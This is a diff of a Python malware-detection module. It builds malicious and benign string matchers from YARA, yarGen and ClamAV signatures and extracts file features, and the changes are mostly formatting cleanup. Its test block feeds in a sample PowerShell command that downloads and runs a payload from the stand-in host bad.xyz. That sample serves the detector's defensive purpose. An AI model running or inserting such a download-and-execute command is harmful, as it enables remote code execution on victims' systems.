@@ -12,12 +12,11 @@ Works seamlessly on:
 """
 
 import os
-import sys
 import re
 import math
 import glob
 from collections import Counter
-from typing import List, Tuple, Set, Optional
+from typing import List, Set, Optional
 
 import numpy as np
 import joblib
@@ -53,10 +52,12 @@ BENIGN_CORE_STRINGS = [
     b"Mozilla/5.0", b"Content-Type", b"text/html", b"utf-8"
 ]
 
+
 def ln1p(x: float) -> float:
     if x is None or math.isnan(x) or x <= 0.0:
         return 0.0
     return float(math.log1p(x))
+
 
 def shannon_entropy(data: bytes) -> float:
     if not data:
@@ -69,6 +70,7 @@ def shannon_entropy(data: bytes) -> float:
         ent -= p * math.log2(p)
     return float(ent)
 
+
 class UniversalStringMatcher:
     _instance: Optional["UniversalStringMatcher"] = None
 
@@ -78,7 +80,7 @@ class UniversalStringMatcher:
         self.clamav_dir = clamav_dir
         self.website_dir = website_dir
         self.cache_path = os.path.join(os.path.dirname(__file__), cache_path)
-        
+
         self.automaton_mal = ahocorasick.Automaton()
         self.automaton_ben = ahocorasick.Automaton()
         self.is_loaded = False
@@ -97,17 +99,17 @@ class UniversalStringMatcher:
                 cached = joblib.load(self.cache_path)
                 mal_words = cached["mal_words"]
                 ben_words = cached["ben_words"]
-                
+
                 for idx, w in enumerate(mal_words):
                     w_str = w.decode("latin1") if isinstance(w, bytes) else str(w)
                     self.automaton_mal.add_word(w_str, (idx, w))
                 self.automaton_mal.make_automaton()
-                
+
                 for idx, w in enumerate(ben_words):
                     w_str = w.decode("latin1") if isinstance(w, bytes) else str(w)
                     self.automaton_ben.add_word(w_str, (idx, w))
                 self.automaton_ben.make_automaton()
-                
+
                 self.is_loaded = True
                 print(f"[+] Loaded {len(mal_words):,} Malicious & {len(ben_words):,} Benign patterns into Automata!")
                 return
@@ -117,7 +119,8 @@ class UniversalStringMatcher:
         self._build_automata()
 
     def _build_automata(self):
-        print("[*] Compiling Universal Malicious & Benign String Corpi from YARA-X, yarGen DBs, and ClamAV...", flush=True)
+        print("[*] Compiling Universal Malicious & Benign String Corpi from YARA-X, yarGen DBs, and ClamAV...",
+              flush=True)
         mal_words: Set[bytes] = set()
         ben_words: Set[bytes] = set()
 
@@ -168,7 +171,8 @@ class UniversalStringMatcher:
         # 2b. yarGen Benign Databases
         yargen_dbs_dir = os.path.join(os.path.dirname(os.path.dirname(self.website_dir)), "yarGen", "dbs")
         if os.path.exists(yargen_dbs_dir):
-            import gzip, json
+            import gzip
+            import json
             for db_file in glob.glob(os.path.join(yargen_dbs_dir, "good-strings-part*.db")):
                 try:
                     with gzip.open(db_file, "rt", encoding="utf-8", errors="ignore") as gz:
@@ -185,7 +189,7 @@ class UniversalStringMatcher:
             os.path.join(os.path.dirname(self.website_dir), "yara-x", "rules"),
             os.path.join(os.path.dirname(self.website_dir), "yara-x"),
             os.path.join(os.path.dirname(os.path.dirname(self.website_dir)), "docs", "yara_rules"),
-            os.path.dirname(self.website_dir) # Check for machine_learning_*.yar
+            os.path.dirname(self.website_dir)  # Check for machine_learning_*.yar
         ]
         str_pat = re.compile(r'\$([a-zA-Z0-9_]+)\s*=\s*"([^"]{6,120})"')
         hex_pat = re.compile(r'\$([a-zA-Z0-9_]+)\s*=\s*\{([0-9a-fA-F\s]{12,120})\}')
@@ -228,7 +232,8 @@ class UniversalStringMatcher:
                 try:
                     bname = os.path.basename(mal_db_f)
                     min_count = 3 if ("javascript" in bname or "datamaliciousorder" in bname) else 2
-                    print(f"  [>] Loading high-frequency signatures from {bname} (min_occurrences: {min_count})...", flush=True)
+                    print(f"  [>] Loading high-frequency signatures from {bname} (min_occurrences: {min_count})...",
+                          flush=True)
                     with gzip.open(mal_db_f, "rt", encoding="utf-8", errors="ignore") as gz:
                         d = json.load(gz)
                         for s_cand, cnt in d.items():
@@ -238,7 +243,8 @@ class UniversalStringMatcher:
                 except Exception as e:
                     print(f"  [!] Error loading {mal_db_f}: {e}", flush=True)
             if mal_db_count > 0:
-                print(f"[+] Loaded {mal_db_count:,} high-frequency patterns from yarGen Malicious Databases", flush=True)
+                print(f"[+] Loaded {mal_db_count:,} high-frequency patterns from yarGen Malicious Databases",
+                      flush=True)
 
         # 4. Strings Directly from Malware Samples (PE, JS, APK) and Export Directories
         malware_dirs = [
@@ -291,13 +297,14 @@ class UniversalStringMatcher:
                             except Exception:
                                 pass
                 if exp_count > 0:
-                    print(f"[+] Harvested {exp_count:,} strings from yarGen export dir: {os.path.basename(exp_dir)}", flush=True)
+                    print(f"[+] Harvested {exp_count:,} strings from yarGen export dir: {os.path.basename(exp_dir)}",
+                          flush=True)
 
         # 5. Malicious Strings from ClamAV Database
         if os.path.exists(self.clamav_dir):
             ndb_files = glob.glob(os.path.join(self.clamav_dir, "*.ndb"))
             ldb_files = glob.glob(os.path.join(self.clamav_dir, "*.ldb"))
-            
+
             for fpath in ndb_files + ldb_files:
                 try:
                     with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
@@ -339,8 +346,10 @@ class UniversalStringMatcher:
         mal_words = cleaned_mal_words
         ben_words = {w for w in ben_words if len(w) >= 4}
 
-        print(f"[+] Dropped {dropped_count:,} Malicious candidates colliding with Benign Goodware (Whitelist priority).", flush=True)
-        print(f"[+] Compiled {len(mal_words):,} Clean Malicious patterns and {len(ben_words):,} Benign patterns.", flush=True)
+        print(f"[+] Dropped {dropped_count:,} Malicious candidates colliding with Benign Goodware (Whitelist "
+              "priority).", flush=True)
+        print(f"[+] Compiled {len(mal_words):,} Clean Malicious patterns and {len(ben_words):,} Benign patterns.",
+              flush=True)
 
         # Build Automata using latin1 1-to-1 byte mapping
         for idx, w in enumerate(mal_words):
@@ -399,7 +408,7 @@ class UniversalStringMatcher:
             ent_mean, ent_max, high_ent_count = 0.0, 0.0, 0
 
         # Aho-Corasick Matching against full byte buffer (lower-cased for case-insensitivity)
-        buf_lower = data[:1024 * 1024].lower() # Scan up to 1 MB for speed and efficiency
+        buf_lower = data[:1024 * 1024].lower()  # Scan up to 1 MB for speed and efficiency
         buf_latin1 = buf_lower.decode("latin1")
 
         mal_hits = 0
@@ -427,7 +436,7 @@ class UniversalStringMatcher:
 
         # Structural header heuristics
         has_exec_header = 0.0
-        if data.startswith(b"MZ") or data.startswith(b"\x7fELF") or data.startswith(b"PK\x03\x04") or data.startswith(b"dex\n"):
+        if data.startswith((b"MZ", b"\x7fELF", b"PK\x03\x04", b"dex\n")):
             has_exec_header = 1.0
 
         # Non-ascii & printable character ratios
@@ -450,7 +459,7 @@ class UniversalStringMatcher:
             mal_to_ben_ratio,
             mal_density,
             ben_density,
-            ln1p(mal_hits), # ClamAV signature hit proxy
+            ln1p(mal_hits),  # ClamAV signature hit proxy
             ln1p(high_ent_count),
             ln1p(base64_count),
             ln1p(hex_count),
@@ -463,6 +472,7 @@ class UniversalStringMatcher:
             printable_ratio,
         ]
 
+
 STRING_FEATURE_NAMES = [
     "total_strings", "avg_string_len", "max_string_len", "byte_entropy",
     "string_entropy_mean", "string_entropy_max", "mal_hits_total", "mal_hits_unique",
@@ -474,7 +484,8 @@ STRING_FEATURE_NAMES = [
 
 if __name__ == "__main__":
     matcher = UniversalStringMatcher.get_instance()
-    sample = b"MZ\x90\x00\x03\x00\x00\x00powershell.exe -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://bad.xyz/payload.bin') kernel32.dll ExitProcess"
+    sample = (b"MZ\x90\x00\x03\x00\x00\x00powershell.exe -ExecutionPolicy Bypass -Command IEX "
+              b"(New-Object Net.WebClient).DownloadString('http://bad.xyz/payload.bin') kernel32.dll ExitProcess")
     feats = matcher.extract_features(sample)
     print("\n[*] Extracted Test Features (24 features):")
     for name, val in zip(STRING_FEATURE_NAMES, feats):
